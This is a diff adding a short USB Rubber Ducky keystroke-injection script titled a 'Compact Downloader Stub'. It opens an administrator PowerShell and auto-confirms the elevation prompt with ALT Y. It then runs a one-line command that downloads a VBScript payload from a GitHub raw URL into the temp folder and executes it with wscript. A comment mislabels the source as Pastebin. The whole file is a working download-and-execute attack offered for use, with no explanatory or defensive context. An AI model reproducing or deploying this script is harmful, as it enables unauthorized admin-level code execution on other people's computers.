@@ -1,0 +1,19 @@
+REM --- Rubber Ducky Script v1.0: Compact Downloader Stub ---
+DEFAULT_DELAY 100
+DELAY 1000
+
+REM Open windows start menu
+GUI
+DELAY 500
+
+REM search powershell and run as admin
+STRING powershell
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 300
+ALT Y
+DELAY 400
+
+REM Download raw VBScript payload from Pastebin and execute via Wscript
+STRING iwr 'https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/michael_jackson/payload.vbs' -OutFile $env:TEMP\s.vbs; wscript $env:TEMP\s.vbs; exit
+ENTER
